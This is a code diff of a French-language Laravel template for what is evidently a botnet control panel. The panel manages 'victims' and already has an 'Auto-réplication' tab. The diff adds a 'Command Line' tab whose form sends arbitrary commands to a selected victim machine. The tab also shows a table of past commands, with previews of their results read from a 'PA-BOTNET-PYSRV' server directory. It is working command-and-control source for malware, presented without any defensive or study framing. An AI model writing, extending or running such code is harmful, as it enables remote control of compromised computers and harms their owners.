@@ -39,6 +39,10 @@
                         <li class="nav-item flex-fill" role="autoréplication">
                             <button class="nav-link w-100" id="autorep-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-autorep" type="button" role="tab" aria-controls="autorep" aria-selected="false">Auto-réplication</button>
                         </li>
+                        <li class="nav-item flex-fill" role="command-line">
+                            <button class="nav-link w-100" id="command-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-command" type="button" role="tab" aria-controls="command" aria-selected="false">Command Line</button>
+                        </li>
+
                     </ul>
                     @if(session('output'))
                         <div class="alert alert-info">{{ session('output') }}</div>
@@ -402,6 +406,76 @@
                                                         <td>{{ $autorep->state }}</td>
                                                         <td>{{ $autorep->created_at->format('H:i') }}</td>
                                                         <td>{{ $autorep->created_at->format('d/m/Y') }}</td>
+                                                    </tr>
+                                                @endforeach
+                                            </tbody>
+                                        </table>
+                                    @endif
+                                </div>
+                            </div>
+                        </div>
+                        <!-- Command Line -->
+                        <div class="tab-pane fade" id="bordered-justified-command" role="tabpanel" aria-labelledby="command-tab">
+                            <div class="card">
+                                <div class="card-body">
+                                    <h5 class="card-title">Command Line</h5>
+                                    <form method="POST" action="{{ route('victims.command') }}" class="row g-3">
+                                        @csrf
+                                            <input type="hidden" name="victim_id" value="{{ $victim->id }}">
+                                            <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
+                                            <div class="col-md-2">
+                                                <input type="text" class="form-control" placeholder="command" name="value"  required>
+                                            </div>
+                                            <div class="col-md-1">
+                                                <button type="submit" class="btn btn-warning"><i class="bi bi-terminal"></i></button>
+                                            </div>
+                                    </form>
+                                    <br>
+                                    @if ($commands->isEmpty())
+                                        <div class="alert alert-warning" role="alert">
+                                            Aucune commande enregistrée.
+                                        </div>
+                                    @else
+                                        <table class="table">
+                                            <thead>
+                                                <tr>
+                                                    <th scope="col">Id</th>
+                                                    <th scope="col">statut</th>
+                                                    <th scope="col">commande</th>
+                                                    <th scope="col">résultat</th>
+                                                    <th scope="col">Heure</th>
+                                                    <th scope="col">Date</th>
+                                                    <th scope="col">Actions</th>
+                                                </tr>
+                                            </thead>
+                                            <tbody>
+                                                @foreach ($commands as $command)
+                                                    @php
+                                                        $textArray = json_decode($command->text, true);
+                                                        $arg1 = $textArray['arg1'] ?? '';
+                                                        $path = env('PATH_PYTHON_EXECUTABLE');
+
+                                                        if ($command->result == NULL) {
+                                                            $resultPreview = '';
+                                                        }
+                                                        else {
+                                                            $filePath = $path."/PA-BOTNET-PYSRV/{$command->result}";
+                                                            if (!empty($filePath) && file_exists($filePath)) {
+                                                                $fileContent = file_get_contents($filePath);
+                                                                $resultPreview = substr($fileContent, 0, 30) . (strlen($fileContent) > 30 ? '...' : '');
+                                                            }
+                                                        }
+                                                    @endphp  
+                                                    <tr>
+                                                        <th scope="row">{{ $command->id }}</th>
+                                                        <td>{{ $command->state }}</td>
+                                                        <td>{{ $arg1 }}</td>
+                                                        <td>{{ $resultPreview   }}</td>
+                                                        <td>{{ $command->created_at->format('H:i') }}</td>
+                                                        <td>{{ $command->created_at->format('d/m/Y') }}</td>
+                                                        <td>
+                                                            <button type="button" class="btn btn-success">Télécharger</button>
+                                                        </td>
                                                     </tr>
                                                 @endforeach
                                             </tbody>
